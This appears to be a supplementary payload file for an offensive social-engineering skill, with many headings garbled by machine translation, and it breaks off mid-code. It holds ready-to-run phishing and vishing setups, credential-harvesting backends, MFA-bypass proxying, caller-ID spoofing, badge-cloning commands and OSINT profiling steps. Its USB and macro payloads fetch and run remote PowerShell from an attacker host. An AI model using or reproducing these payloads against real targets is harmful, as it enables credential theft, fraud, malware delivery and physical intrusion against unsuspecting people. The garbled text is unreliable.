# Social Engineering Payloads / social engineeringpayload

> thisfileis `SKILL.md` Supplementary Files，containsall SE attackpayload，byclassotherorganization。

---

## 1. Phishing (phishing attack)

### 1.1 SET (Social-Engineer Toolkit) Campaign

```bash
# start SET（need root permission）
sudo setoolkit

# main菜singleselectpath：
# 1) Social-Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# 1) Perform a Mass Email Attack
# 2) Create a FileFormat Payload
# 3) Create a Social Engineering Template
# 2) Website Attack Vectors
# 1) Java Applet Attack Method
# 2) Metasploit Browser Exploit Method
# 3) Credential Harvester Attack Method
# 4) Tabnabbing Attack Method
# 5) Web Jacking Attack Method
# 3) Infectious Media Generator
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack Vector
# 8) QRCode Generator Attack Vector
# 9) Powershell Attack Vectors

# SET credential harvestingtoolconfiguration
# select Website Attack Vectors -> Credential Harvester Attack Method
# input要clone URL（such as https://target-company.com/login）
# inputthismachine IP: <attacker-ip>
# SET automated createclonepage，POST formpoint toattackerserver
```

### 1.2 SET mailpiecetemplate Payload

```
Subject: {紧急通知} IT 部门密码策略更新 - 需立即操作

尊敬的 {target_name}，

根据公司安全政策第 4.2 条，您的域账户密码将于 {date} 过期。
为避免账户锁定，请立即通过以下安全链接更新密码：

https://secure-auth.{spoofed-domain}/password-reset?token={random}

IT Security Team
{target-company} Information Technology
内线: {fake_ext}
```

### 1.3 GoPhish Campaign automated

```bash
# GoPhish start
./gophish

# through REST API automated create Campaign
# Step 1: create Sending Profile (SMTP configuration)
curl -X POST https://gophish-server:3333/api/smtp/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Corporate-SMTP",
    "host": "smtp.evil-server.com:587",
    "from_address": "it-support@spoofed-domain.com",
    "username": "user",
    "password": "pass",
    "headers": [
      {"key": "X-Mailer", "value": "Corporate-Mail-System"}
    ]
  }'

# Step 2: create Landing Page (credential harvestingpage)
curl -X POST https://gophish-server:3333/api/pages/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSO-Login-Clone",
    "html": "<html>...</html>",
    "capture_credentials": true,
    "capture_passwords": true,
    "redirect_url": "https://real-sso.target-company.com"
  }'

# Step 3: createmailpiecetemplate
curl -X POST https://gophish-server:3333/api/templates/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Password-Expiry-Notice",
    "subject": "Action Required: Password Expiration Notice",
    "html": "<p>Dear {{.FirstName}},</p><p>Your password expires...</p>",
    "add_tracking_image": true
  }'

# Step 4: importtargetusergroup
curl -X POST https://gophish-server:3333/api/groups/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Finance-Department",
    "targets": [
      {"email": "user1@target.com", "first_name": "John", "last_name": "Doe"},
      {"email": "user2@target.com", "first_name": "Jane", "last_name": "Smith"}
    ]
  }'

# Step 5: start Campaign
curl -X POST https://gophish-server:3333/api/campaigns/ \
  -H "Authorization: {api_key}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q2-Security-Awareness-Test",
    "template": {"name": "Password-Expiry-Notice"},
    "page": {"name": "SSO-Login-Clone"},
    "smtp": {"name": "Corporate-SMTP"},
    "groups": [{"name": "Finance-Department"}],
    "launch_date": "2026-05-01T09:00:00Z"
  }'

# Step 6: obtain Campaign result
curl -X GET https://gophish-server:3333/api/campaigns/{campaign_id}/results \
  -H "Authorization: {api_key}"
```

### 1.4 King-Phisher Campaign

```bash
# King-Phisher serviceendstart
king-phisher-server -f server_config.yml

# King-Phisher clientconnect
king-phisher-client

# through YAML configuration Campaign
# server_config.yml criticalconfiguration：
# server:
# host: 0.0.0.0
# port: 80
# database: sqlite:///king_phisher.db
# server_secret: <secret>
# uid: king-phisher
# web_root: /opt/king-phisher/data/server/www

# Campaign parameter：
# - mailpiecetemplate (HTML + Plain Text)
# - targetlist (CSV import)
# - sendinterval隔 (avoidtriggerspeedratelimitation)
# - point击traceandcredentialsrecord
# - 防awarenesstrainingmode (education URL)
```

---

## 2. Email Spoofing (mailpieceforgery)

### 2.1 SPF/DKIM/DMARC reconnaissance

```bash
# checktargetdomain SPF record
dig txt target-company.com | grep -i spf
# outputexample: "v=spf1 include:_spf.google.com ~all"
# ~all = softfail (can bybypass) vs -all = hardfail (较difficultbypass)

# check DKIM record
dig txt default._domainkey.target-company.com
# outputexample: "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3..."

# check DMARC policy
dig txt _dmarc.target-company.com
# outputexample: "v=DMARC1; p=none; rua=mailto:dmarc@target-company.com"
# p=none (noforce) / p=quarantine (isolation) / p=reject (deny)

# use smtp-user-enum verifyemail addressaddressexistsity
smtp-user-enum -M VRFY -U users.txt -t mail.target-company.com

# use swaks perform SMTP sessiontesting
swaks --to victim@target-company.com \
 --from spoofed@evil.com \
 --server mail.target-company.com \
 --header "Subject: Test" \
 --body "Test email"
```

### 2.2 mailpieceforgerysend

```bash
# use sendemail sendforgerymailpiece
sendemail -f "IT-Support@target-company.com" \
  -t victim@target-company.com \
  -u "紧急：密码过期通知" \
  -m "您的邮箱密码将在24小时后过期，请立即更新：http://evil-server/reset" \
  -s smtp.evil-server.com:587 \
  -xu username -xp password \
  -o tls=yes

# use swaks sendband附piece forgerymailpiece
swaks --to victim@target-company.com \
 --from "ceo@target-company.com" \
 --header "Subject: Q4 Financial Review - Confidential" \
 --body "Please review the attached document urgently." \
 --attach @malicious_document.xlsx \
 --server smtp.evil-server.com:587 \
 --auth LOGIN \
 --auth-user "username" \
 --auth-password "password" \
 --tls

# use Python smtp-lib batchamountsend
python3 -c "
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

smtp = smtplib.SMTP('smtp.evil-server.com', 587)
smtp.starttls()
smtp.login('user', 'pass')

msg = MIMEMultipart('alternative')
msg['From'] = 'HR-Benefits@target-company.com'
msg['Subject'] = 'Annual Benefits Enrollment - Action Required'

with open('targets.txt') as f:
    targets = [line.strip() for line in f if line.strip()]

html = open('email_template.html').read()
for target in targets:
    msg['To'] = target
    msg.set_payload(html)
    smtp.send_message(msg)
    print(f'Sent to {target}')

smtp.quit()
"
```

### 2.3 SPF/DKIM/DMARC bypasstechnique

```bash
# technique 1: exploit SPF softfail (~all) - usenot authorization IP send
# targetdomainuse ~all andnon -all when ，largemultiplenumbermailpiecegateway仍willdeliver

# technique 2: similardomain namespoofing (Lookalike Domain)
# register rnicrosoft.com (r+n alternative m) or target-company.com (零宽characters)
# SPF checkthroughbecauseas确realisthedomain combinemethodsendpieceperson

# technique 3: exploitNo.third-partymailpieceservice
# usecan by SPF include mailpieceservice (such as Google Workspace, Office 365)
# such as resulttargetdomain include:_spf.google.com，can through Google send

# technique 4: DMARC none policyexploit
# p=none when DMARC notexecuteany policy，onlysendreport
# can inreporttoreachbeforecompleteattackwindow

# technique 5: mailpieceheadinjection
# throughmodify Reply-To、Return-Path etc.headdepartmentFieldbypasspartialcheck
swaks --to victim@target.com \
 --from legitimate-sender@target.com \
 --header "Reply-To: attacker@evil.com" \
 --header "Return-Path: attacker@evil.com" \
 --header "X-Priority: 1" \
 --body "Urgent: please reply to this email immediately"
```

---

## 3. Credential Harvesting Pages (credential harvestingpage)

### 3.1 websitecloneandcredentialscapture

```bash
# SET credential harvestingmode
sudo setoolkit
# -> Website Attack Vectors (2)
# -> Credential Harvester Attack Method (3)
# -> Site Cloner (2)
# input要clone URL: https://accounts.google.com
# inputthismachine IP: <attacker-ip>
# SET automated createclonepage，POST formpoint toattackerserver

# manual clone + credentialscapture (httrack)
httrack https://target-company.com/login -O /var/www/clone/

# modifyclonepage form action
# raw: <form action="/api/authenticate" method="POST">
# modify: <form action="http://attacker-server/capture.php" method="POST">
```

### 3.2 credentialscapturebackend

```php
<?php
// capture.php - 凭据捕获脚本
$log_file = '/var/log/harvest/credentials.log';
$redirect_url = 'https://real-target-company.com/login';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    $credentials = [];
    foreach ($_POST as $key => $value) {
        $credentials[$key] = $value;
    }

    $log_entry = sprintf(
        "[%s] IP: %s | UA: %s | Data: %s\n",
        $timestamp,
        $ip,
        $user_agent,
        json_encode($credentials)
    );

    file_put_contents($log_file, $log_entry, FILE_APPEND);
    header("Location: " . $redirect_url);
    exit();
}

header("Location: " . $redirect_url);
exit();
?>
```

### 3.3 GoPhish Landing Page HTML

```html
<!-- GoPhish 凭据收割页面模板 -->
<!DOCTYPE html>
<html>
<head>
  <title>Sign In</title>
  <!-- 复制原始页面的 CSS/JS 资源 -->
</head>
<body>
  <form action="" method="POST">
    <!-- GoPhish 自动注入捕获逻辑 -->
    <input type="text" name="username" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>
  <!-- {{.Tracker}} - GoPhish 追踪像素 -->
</body>
</html>
```

### 3.4 Nginx reverseproxycredential harvesting

```nginx
# nginx.conf - reverseproxymodecredential harvesting
# flowamountthroughoverattackerserver，recordcredentialsafterforwardtorealserver
server {
    listen 443 ssl;
    server_name secure-auth.spoofed-domain.com;

    ssl_certificate /etc/ssl/certs/spoofed.pem;
    ssl_certificate_key /etc/ssl/private/spoofed.key;

    location / {
 # record POST requestbodyin credentials
        access_log /var/log/nginx/harvest.log combined;

        lua_need_request_body on;
        access_by_lua_block {
            if ngx.req.get_method() == "POST" then
                ngx.req.read_body()
                local body = ngx.req.get_body_data()
                if body then
                    local f = io.open("/var/log/harvest/creds.log", "a")
                    f:write(os.date() .. " | " .. body .. "\n")
                    f:close()
                end
            end
        }

        proxy_pass https://real-target-company.com;
        proxy_set_header Host real-target-company.com;
        proxy_ssl_server_name on;
    }
}
```

---

## 4. SMS Phishing / Smishing (短informationphishing)

### 4.1 Smishing Payload template

```
# 银row/金融class
[Bank Name]: We detected unusual activity on your account.
Verify now: https://{spoofed-domain}/secure-verify or call {fake-phone}

# fast递/物flowclass
[Courier]: Your package could not be delivered.
Schedule redelivery: https://{spoofed-domain}/redelivery?ref={tracking}

# IT/security class
[IT Security]: Unauthorized access detected on your account.
Secure your account: https://{spoofed-domain}/security-check

# HR/row政class
[HR Department]: Your annual benefits enrollment closes today.
Complete now: https://{spoofed-domain}/benefits-enrollment

# 政府machineconstructclass
[Tax Authority]: Your tax refund is pending verification.
Verify identity: https://{spoofed-domain}/tax-refund-verify
```

### 4.2 Smishing Toolcommand

```bash
# use SMS gatewayservicesendphishing短information
# through Twilio API (needcombinemethodauthorization testingaccount)
curl -X POST https://api.twilio.com/2010-04-01/Accounts/{sid}/Messages.json \
 --data-urlencode "Body=[IT Security] Unauthorized access detected. Verify: https://spoofed/verify" \
 --data-urlencode "From=+15551234567" \
 --data-urlencode "To=+15559876543" \
  -u {sid}:{auth_token}

# use GoPhish SMS plugin (such as resultcan use)
# orthrough SMTP-to-SMS gatewaysend
sendemail -f "noreply@spoofed.com" \
  -t victim-phone-number@sms-gateway.carrier.com \
  -u "Security Alert" \
  -m "Unauthorized access. Verify: https://spoofed/verify" \
  -s smtp.evil-server.com:587

# common 运营商 SMS gatewayaddress:
# AT&T: number@txt.att.net
# Verizon: number@vtext.com
# T-Mobile: number@tmomail.net
```

---

## 5. Vishing Techniques (voicephishing)

### 5.1 Vishing scripttemplate

```
# IT Help Desk 冒chargescript
Agent: "Hi, this is {fake_name} from IT Support. We've detected
        unauthorized access attempts on your account from an IP in
        {foreign_country}. For security, I need to verify your identity.
        Could you confirm your username and password?"

Target: [提供凭据]

Agent: "Thank you. I've now secured your account. You should receive
        a confirmation email shortly. Is there anything else I can
        help with?"

# HR/row政冒chargescript
Agent: "Hello, this is {fake_name} from Human Resources. I'm calling
        about your annual benefits enrollment. There seems to be an
        issue with your portal access. Can you try logging in at
        {spoofed_url} while I stay on the line?"

# techniquesupports冒chargescript (Microsoft/Google)
Agent: "Hello, this is Microsoft Security Center. We've detected
        malware on your computer that is sending spam. I can walk
        you through removing it. First, please open your browser
        and go to {remote_access_url} so I can connect and assist."
```

### 5.2 Vishing Tool

```bash
# VoIP callTool
# use SIP clientinitiate VoIP call
# caller ID spoofing
sipcli -d target-number -s spoofed-caller-id -u sip-user -p sip-password -h sip-server

# use Asterisk/FreePBX build VoIP basic facility
# asterisk basic configuration:
# /etc/asterisk/sip.conf - configuration SIP account
# /etc/asterisk/extensions.conf - configuration拨numberplan

# automated voicephishing (Vishing Bot)
# use Twilio Voice API
curl -X POST https://api.twilio.com/2010-04-01/Accounts/{sid}/Calls.json \
 --data-urlencode "Url=https://evil-server/vishing-script.xml" \
 --data-urlencode "To=+15559876543" \
 --data-urlencode "From=+15551234567" \
  -u {sid}:{auth_token}

# TwiML voicescript (vishing-script.xml)
# <?xml version="1.0" encoding="UTF-8"?>
# <Response>
# <Say voice="alice">
# This is an automated security notification from IT department.
# We have detected unauthorized access to your account.
# Please enter your employee ID followed by the pound sign.
# </Say>
# <Gather numDigits="6" action="/capture-input" method="POST"/>
# </Response>
```

---

## 6. Baiting / Drop USB Payloads (decoy投放)

### 6.1 USB decoyfiletype

```bash
# pseudoinstalldocumentationfilename
"Q4_Salary_Adjustments_CONFIDENTIAL.exe"          # 可执行文件伪装
"Employee_Benefits_2026.pdf.lnk"                  # 快捷方式伪装
"Company_Policy_Update.docm"                       # 启用宏的文档
"Network_Diagram_v2.xlsm"                         # 启用宏的表格
"Interview_Candidates_PhilHR.exe"                  # 社工热点文件名
"Password_Reset_Instructions.hta"                  # HTML 应用程序

# Rubber Ducky / Hak5 USB Payload
# Duckyscript example (mode拟键盘input)
DELAY 3000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
ENTER

# HID attack (Human Interface Device)
# Bash Bunny payload
# #!/bin/bash
# ATTACKMODE HID STORAGE
# LED R FAST
# Q RUNCOMBO ENTER
# Q DELAY 1000
# Q STRING powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
# Q ENTER
```

### 6.2 USB deliverpolicy

```
物理投递策略：
1. 标签策略 - 贴上 "Salary Data" / "Confidential" / "HR Records" 标签
2. 位置选择 - 停车场、前台、电梯口、洗手间、会议室
3. 外观伪装 - 使用品牌 U 盘外壳、定制印 LOGO
4. 配套材料 - 附带便签 "请查阅 Q4 财务数据" 或 "在会议室发现的"
5. 批量投放 - 投放 5-10 个到不同区域提高命中率

CD/DVD 诱饵：
- 标签: "员工培训视频" / "软件安装盘"
- 内容: 自动运行脚本 + 伪装界面
```

### 6.3 maliciousdocumentation宏 Payload

```vba
' VBA 宏代码 (嵌入 .docm 文件)
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"""
    Shell cmd, vbHide
End Sub

' 侧加载 DLL 技术示例
' 修改 .docx 中的 document.xml.rels 指向恶意模板
' 使用 remoteTemplate 注入
```

---

## 7. Social Media Reconnaissance for Targeting (social mediareconnaissance)

### 7.1 OSINT automated collect

```bash
# Step 1: domain name -> email addresscollect
theHarvester -d target-company.com -b all -l 500
theHarvester -d target-company.com -b google,bing,linkedin -l 200

# Step 2: social mediacrossverify
# LinkedIn: 职bit、department门、tech stack、input职when interval、same事closesystem
# Twitter/X: technique兴趣、近periodactivity、use Tool、地reasonbitconfiguration
# GitHub: open-sourceproject、technique偏好、codeinleakage information、commit when intervalmode
# Facebook/Instagram: personal兴趣、家庭information、bitconfiguration签to、socialexchange圈

# Step 3: Maltego can viewizerelatedanalysis
# machinetooltransformchain:
# Domain -> DNS Names -> IP Address -> AS Number
# Domain -> Email -> Person -> Social Profile -> Phone Number
# Person -> Company -> Colleagues -> Email Addresses
# Phone Number -> Location -> Associated Persons

# Maltego commandrow (maltego canthrough GUI or CE versionrun)
# recommendtransform:
# - To Email Address [from Domain]
# - To Person [from Email]
# - To Social Network Profile [from Person]
# - To Phone Number [from Person]
# - To Location [from Phone Number]

# Step 4: recon-ng automated 聚combine
recon-ng
> marketplace install all
> modules load recon/domains-contacts/email-harvester
> options set source target-company.com
> run
> modules load recon/contacts-profiles/fullcontact
> options set source emails.txt
> run
> back

# recon-ng exportresult
> modules load reporting/csv
> options set filename /tmp/recon-results.csv
> run

# Step 5: Sherlock social mediausernametrace
sherlock target_username --print-found --output results.txt

# Step 6: SpiderFoot automated OSINT
spiderfoot -l 127.0.0.1:5001
# Web UI: http://127.0.0.1:5001
# input: targetemail address、username、phone number、domain name
# automated related: social media、dataleakage、DNS record、暗networkinformation
```

### 7.2 target画像informationchecklist

```
收集维度：
1. 基本信息: 姓名、职位、部门、入职时间、汇报关系
2. 联系方式: 工作邮箱、个人邮箱、电话号码、Skype/Teams
3. 技术画像: 使用的操作系统、编程语言、开发工具、云服务
4. 行为模式: 工作时间、出差频率、会议习惯、沟通偏好
5. 社交关系: 同事关系、上级下级、外部合作伙伴
6. 个人兴趣: 爱好、社团、社交圈、近期活动
7. 安全意识: 是否参与过安全培训、密码策略遵守情况
8. 组织架构: 部门结构、决策链、关键人员
```

---

## 8. Physical Social Engineering (物reasonsocialwork)

### 8.1 Tailgating (tailgating) technique

```
尾随进入策略：
1. 手持重物策略 - 双手抱满快递/文件箱，等待他人刷卡开门
   "Could you get that for me? My hands are full."
2. 忘带门禁策略 - 假装翻找门禁卡
   "Oh, I left my badge at my desk. I just stepped out for coffee."
3. 社交工程策略 - 主动与目标搭话
   "Hi, are you heading to the 3rd floor too? I'm new here."
4. 紧急情况策略 - 伪装维修人员/快递员
   "I have an urgent delivery for the server room."
5. VIP 策略 - 伪装高管/访客
   "I'm here for the board meeting. Can you show me to the conference room?"

物理访问测试清单:
- [ ] 大门/旋转门是否有尾随检测
- [ ] 访客登记是否严格验证身份证件
- [ ] 内部区域是否需要二次刷卡
- [ ] 服务器机房是否有生物识别
- [ ] 安全摄像头是否覆盖所有入口
- [ ] 是否有安全巡逻和抽查
```

### 8.2 物reasonpseudoinstall道tool

```
伪装角色与道具清单：

IT 维修人员:
- 蓝色工装连体衣 + 工具包 + 工牌挂绳
- 贴有 IT 部门标签的笔记本电脑
- 网线测试仪、螺丝刀套装

快递员:
- 快递公司制服 + 快递袋 + 手持终端
- 预先准备的伪造包裹

访客:
- 商务正装 + 会议文件夹 + 名牌
- 打印的会议日程表

清洁人员:
- 清洁公司制服 + 清洁推车
- 进入非工作区域的自然理由

维修承包商:
- 安全帽 + 反光背心 + 工具箱
- 施工许可文件 (伪造)
```

### 8.3 物reasonsocialworknote事item

```
执行原则:
1. 始终保持自信和自然的态度
2. 预先准备合理的借口和理由
3. 了解目标的日常运作流程
4. 准备应急退出方案
5. 记录所有交互细节用于报告
6. 遵守授权范围和规则约束
7. 携带身份验证文件 (红队授权书)
8. 避免引起恐慌或破坏
9. 注意摄像头和安保人员
10. 在计划时间窗口内完成操作
```

---

## 9. Phishing Infrastructure

### Domain Spoofing and Setup

```bash
# Register lookalike domains for phishing campaigns
# Techniques: homoglyph, typosquatting, TLD variation

# Check domain availability for lookalikes
for domain in "target-cornpany.com" "targett-company.com" "target-company.net" "target-c0mpany.com"; do
  whois "$domain" 2>/dev/null | grep -q "No match" && echo "[AVAILABLE] $domain"
done

# Set up DNS records for phishing domain
# A record -> attacker server IP
# MX record -> attacker mail server
# SPF record to pass email checks
cat << 'EOF'
; DNS Zone file for spoofed-domain.com
@       IN  A       203.0.113.50
@       IN  MX  10  mail.spoofed-domain.com
mail    IN  A       203.0.113.50
@       IN  TXT     "v=spf1 ip4:203.0.113.50 -all"
default._domainkey IN TXT "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3..."
_dmarc  IN  TXT     "v=DMARC1; p=none"
EOF
```

### GoPhish Advanced Configuration

```bash
# Full GoPhish deployment with HTTPS and tracking
# Step 1: Generate SSL certificate (Let's Encrypt)
certbot certonly --standalone -d phish.spoofed-domain.com

# Step 2: Configure GoPhish with SSL
cat > config.json << 'EOF'
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/privkey.pem"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/privkey.pem"
  }
}
EOF

# Step 3: Import targets from CSV
curl -X POST https://localhost:3333/api/groups/ \
  -H "Authorization: ${GOPHISH_API_KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"Target-Dept\",\"targets\":$(python3 -c "
import csv, json
targets = []
with open('targets.csv') as f:
    for row in csv.DictReader(f):
        targets.append({'email': row['email'], 'first_name': row['first'], 'last_name': row['last'], 'position': row['title']})
print(json.dumps(targets))
")}"
```

### Email Template with Evasion Techniques

```bash
# Create phishing email that bypasses common filters
cat > phishing_template.html << 'EOF'
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
  <!-- Zero-width characters to break signature detection -->
  <p>Dear {{.FirstName}},</p>
  <p>Your account security review is pending. Our system detected
  unusual sign-in activity from a new device.</p>
  <p><strong>Action Required:</strong> Please verify your identity within 24 hours
  to avoid account suspension.</p>
  <!-- Use legitimate-looking URL with redirect -->
  <p><a href="{{.URL}}" style="background:#0078d4;color:white;padding:12px 24px;text-decoration:none;border-radius:4px;">
  Verify My Identity</a></p>
  <p style="color:#666;font-size:12px;">
  This is an automated message from IT Security.<br>
  Reference: SEC-{{.RId}}<br>
  &copy; 2026 {{.BaseURL}}
  </p>
  {{.Tracker}}
</body>
</html>
EOF

# Upload template via API
curl -X POST https://localhost:3333/api/templates/ \
  -H "Authorization: ${GOPHISH_API_KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"Security-Review-2026\",\"subject\":\"[Action Required] Account Security Review - Ref: {{.RId}}\",\"html\":\"$(cat phishing_template.html | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))')\"}"
```

### Evilginx2 Reverse Proxy Phishing

```bash
# Evilginx2 setup for real-time credential and session token capture
# This bypasses MFA by proxying the real login page

# Install and configure
evilginx2 -p /opt/evilginx2/phishlets

# Configure phishlet for target
: phishlets hostname microsoft365 login.spoofed-domain.com
: phishlets enable microsoft365

# Create lure URL
: lures create microsoft365
: lures edit 0 redirect_url https://office.com
: lures get-url 0

# Monitor captured sessions
: sessions
: sessions 1  # View captured tokens and cookies
```

---

## 10. Vishing Automation

### Automated Call Script with IVR

```bash
# Asterisk dialplan for automated vishing campaign
cat > /etc/asterisk/extensions_vishing.conf << 'EOF'
[vishing-campaign]
exten => s,1,Answer()
same => n,Wait(1)
same => n,Playback(custom/security-alert)
same => n,Background(custom/enter-employee-id)
same => n,Read(EMPID,,6,,,10)
same => n,Background(custom/enter-password)
same => n,Read(PASSWORD,,20,,,30)
same => n,System(echo "${CALLERID(num)}|${EMPID}|${PASSWORD}|$(date)" >> /var/log/vishing/captures.log)
same => n,Playback(custom/thank-you-secured)
same => n,Hangup()
EOF

# Generate audio prompts with text-to-speech
espeak-ng -w /var/lib/asterisk/sounds/custom/security-alert.wav \
  "This is an automated security notification from your IT department. We have detected unauthorized access to your corporate account."
espeak-ng -w /var/lib/asterisk/sounds/custom/enter-employee-id.wav \
  "Please enter your six digit employee ID followed by the pound sign."
```

### Caller ID Spoofing Setup

```bash
# SIP trunk configuration for caller ID manipulation
cat > /etc/asterisk/sip_spoof.conf << 'EOF'
[spoof-trunk]
type=peer
host=sip-provider.com
username=account_id
secret=account_password
fromuser=+15551234567
callerid="IT Security" <+15551234567>
insecure=invite,port
dtmfmode=rfc2833
EOF

# Initiate spoofed call via Asterisk AMI
cat << 'EOF' | nc localhost 5038
Action: Login
Username: admin
Secret: ami_password

Action: Originate
Channel: SIP/spoof-trunk/+1${TARGET_NUMBER}
CallerID: "Corporate IT" <${SPOOFED_NUMBER}>
Context: vishing-campaign
Extension: s
Priority: 1
Async: yes

Action: Logoff
EOF
```

### Vishing Campaign Tracking

```python
#!/usr/bin/env python3
"""Track vishing campaign results and generate reports."""
import csv
import json
from datetime import datetime
from pathlib import Path

CAPTURE_LOG = "/var/log/vishing/captures.log"
TARGETS_FILE = "vishing_targets.csv"

def parse_captures():
    captures = []
    if Path(CAPTURE_LOG).exists():
        with open(CAPTURE_LOG) as f:
            for line in f:
                parts = line.strip().split("|")
                if len(parts) >= 4:
                    captures.append({
                        "phone": parts[0],
                        "employee_id": parts[1],
                        "credential": parts[2],
                        "timestamp": parts[3]
                    })
    return captures

def generate_report():
    captures = parse_captures()
    total_targets = sum(1 for _ in open(TARGETS_FILE)) - 1
    report = {
        "campaign": "Vishing Assessment Q2-2026",
        "total_targets": total_targets,
        "total_captures": len(captures),
        "success_rate": f"{len(captures)/total_targets*100:.1f}%",
        "captures": captures
    }
    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    generate_report()
```

### IVR System Exploitation

```bash
# Enumerate IVR menu options via DTMF brute force
python3 -c "
import itertools
# Generate all 1-3 digit DTMF sequences
sequences = []
for length in range(1, 4):
    for combo in itertools.product('0123456789*#', repeat=length):
        sequences.append(''.join(combo))

# Output as Asterisk call file for automated testing
for i, seq in enumerate(sequences[:100]):
    print(f'''Channel: SIP/trunk/{target_number}
CallerID: \"Test\" <5551234567>
MaxRetries: 0
WaitTime: 30
Context: ivr-test
Extension: s
Priority: 1
Set: DTMF_SEQUENCE={seq}
''')
" > /var/spool/asterisk/outgoing/ivr_test.call

# Monitor IVR responses for hidden menus
# Common hidden codes: 0000, 9999, *#, ##, 1234
for code in "0000" "9999" "1234" "*#" "##" "0#" "**"; do
  echo "Testing IVR code: $code"
done
```

---

## 11. Physical Security Testing

### Badge Cloning with Proxmark3

```bash
# Read HID Prox card (125kHz low-frequency)
proxmark3> lf hid read
# Output: HID Prox TAG ID: 2004263f88

# Clone to T5577 writable card
proxmark3> lf hid clone --r 2004263f88

# Read iCLASS card (13.56MHz high-frequency)
proxmark3> hf iclass reader
proxmark3> hf iclass dump --ki 0

# Read MIFARE Classic
proxmark3> hf mf autopwn
# Dumps all sectors and keys

# Simulate a card (no physical clone needed)
proxmark3> lf hid sim --r 2004263f88

# Brute force facility codes (if card format is known)
for fc in $(seq 1 255); do
  for cn in $(seq 1 65535); do
    proxmark3> lf hid sim --r $(python3 -c "print(hex(($fc << 16) | $cn))")
  done
done
```

### Lock Picking and Bypass Tools

```bash
# Physical security assessment toolkit checklist
cat << 'EOF'
Lock Bypass Equipment:
1. Lock pick set (standard pin tumbler)
   - Short hook, medium hook, diamond, rake (bogota, snake)
   - Tension wrenches (top-of-keyway, bottom-of-keyway)
2. Bypass tools
   - Under-door tool (UDT) for lever handles
   - Latch slipping shims (credit card technique)
   - Bump keys (for pin tumbler locks)
   - Tubular lock picks (for vending machines, elevators)
3. Electronic bypass
   - Electromagnetic lock bypass (REX sensor trigger)
   - Relay attack equipment (for vehicle entry)
4. Covert entry tools
   - Traveler hook (for double-sided deadbolts)
   - Comb picks (for wafer locks)
   - Decoder picks (for combination locks)

Testing Procedure:
1. Document lock type and brand
2. Photograph all entry points
3. Attempt non-destructive entry
4. Time each attempt (report average)
5. Document success/failure for each method
6. Photograph evidence of entry
EOF
```

### Tailgating Detection Assessment

```bash
# Script to document physical access test results
cat > /tmp/physical_access_log.sh << 'SCRIPT'
#!/bin/bash
# Physical Access Testing Logger
LOG_FILE="physical_access_$(date +%Y%m%d).csv"

if [ ! -f "$LOG_FILE" ]; then
  echo "timestamp,location,method,success,notes,evidence_photo" > "$LOG_FILE"
fi

echo "=== Physical Access Test Entry ==="
read -p "Location (e.g., main-entrance, server-room): " location
read -p "Method (tailgate/badge-clone/social/bypass): " method
read -p "Success (yes/no): " success
read -p "Notes: " notes
read -p "Evidence photo filename: " photo

echo "$(date +%Y-%m-%dT%H:%M:%S),$location,$method,$success,$notes,$photo" >> "$LOG_FILE"
echo "[+] Entry logged to $LOG_FILE"
SCRIPT
chmod +x /tmp/physical_access_log.sh
```

### Wireless Badge Reader Exploitation

```bash
# Long-range RFID reader for covert badge capture
# Using HackRF or dedicated long-range reader

# Monitor for badge reads at distance (Proxmark3 with extended antenna)
proxmark3> lf search
proxmark3> lf hid watch
# Wait near target entrance, capture badge data as employees pass

# ESPKey - covert Wiegand interceptor
# Install between badge reader and access controller
# Captures all badge swipes over WiFi
cat << 'EOF'
ESPKey Configuration:
1. Open ESPKey WiFi AP (default: ESPKey_XXXX)
2. Configure: http://192.168.4.1
3. Set WiFi client mode to exfiltrate data
4. Install inline on Wiegand D0/D1 lines
5. Monitor captures via web interface
6. Export: curl http://espkey-ip/log.csv
EOF
```

---

## 12. Social Media OSINT for SE

### Profile Building Automation

```bash
# Comprehensive target profiling from social media
# LinkedIn scraping (use authorized tools only)
python3 -c "
import json

# Build target profile from multiple sources
profile = {
    'target': 'John Smith',
    'company': 'Target Corp',
    'sources': {
        'linkedin': {
            'title': 'Senior IT Administrator',
            'tenure': '3 years',
            'skills': ['Active Directory', 'Azure', 'PowerShell'],
            'connections': 500,
            'groups': ['IT Security Professionals', 'Azure Admins']
        },
        'github': {
            'username': 'jsmith-target',
